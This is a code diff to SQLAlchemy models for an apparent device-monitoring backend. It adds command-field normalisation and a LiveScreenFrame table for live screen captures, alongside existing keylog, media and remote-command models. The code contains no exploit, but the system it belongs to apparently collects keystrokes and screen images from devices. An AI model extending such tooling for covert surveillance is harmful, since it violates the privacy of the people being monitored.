@@ -1,4 +1,4 @@
-from sqlalchemy import Column, Integer, String, Boolean, DateTime, ForeignKey, BigInteger
+from sqlalchemy import Column, Integer, String, Boolean, DateTime, ForeignKey, BigInteger, LargeBinary
 from sqlalchemy.orm import relationship
 from sqlalchemy.sql import func
 from .database import Base
@@ -149,6 +149,23 @@ class Command(Base):
     device_id = Column(Integer, ForeignKey("devices.id"))
     owner_id = Column(Integer, ForeignKey("users.id"))
 
+    @property
+    def command(self):
+        return self.command_type
+
+    def __init__(self, **kwargs):
+        if "command" in kwargs and "command_type" not in kwargs:
+            kwargs["command_type"] = kwargs.pop("command")
+        if "created_at" in kwargs and isinstance(kwargs["created_at"], (int, float)):
+            import datetime
+            ts = kwargs["created_at"]
+            if ts > 1e11:
+                ts = ts / 1000.0
+            kwargs["created_at"] = datetime.datetime.fromtimestamp(ts, tz=datetime.timezone.utc)
+        if "status" in kwargs and kwargs["status"] == "PENDING":
+            kwargs["status"] = "pending"
+        super().__init__(**kwargs)
+
 class MediaFile(Base):
     __tablename__ = "media_files"
     id = Column(Integer, primary_key=True, index=True)
@@ -171,4 +188,12 @@ class Keylog(Base):
     owner = relationship("User", back_populates="keylogs")
     device = relationship("Device", back_populates="keylogs")
 
+class LiveScreenFrame(Base):
+    __tablename__ = "live_screen_frames"
 
+    id = Column(Integer, primary_key=True, index=True)
+    device_id = Column(Integer, ForeignKey("devices.id"), unique=True, index=True)
+    frame_data = Column(LargeBinary)
+    timestamp = Column(BigInteger)
+
+    device = relationship("Device")
